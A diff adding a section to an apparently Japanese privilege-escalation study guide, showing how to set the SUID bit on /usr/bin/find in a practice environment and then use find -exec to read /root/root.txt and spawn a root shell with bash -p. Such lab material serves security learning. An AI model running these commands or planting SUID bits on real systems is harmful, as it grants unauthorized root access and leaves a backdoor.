@@ -59,6 +59,30 @@ find / -perm -u=s -type f 2>/dev/null
 /usr/bin/find . -exec /bin/sh -p \; -quit
 ```
 
+#### find に SUID を手動で設定する場合（練習環境）
+
+```bash
+sudo chmod 4755 /usr/bin/find
+# または
+sudo chmod u+s /usr/bin/find
+
+# 確認
+ls -al /usr/bin/find
+# -rwsr-xr-x 1 root root ...
+```
+
+SUID が立つと root 権限でファイルを読み取れる：
+
+```bash
+# root 権限のファイルを読む
+find /root/root.txt -exec cat {} \;
+
+# root シェルを取得
+find . -exec /bin/bash -p \; -quit
+bash# whoami
+# root
+```
+
 ### 3. Cronジョブ悪用
 ```bash
 # ワイルドカードやパス未指定のスクリプトを探す
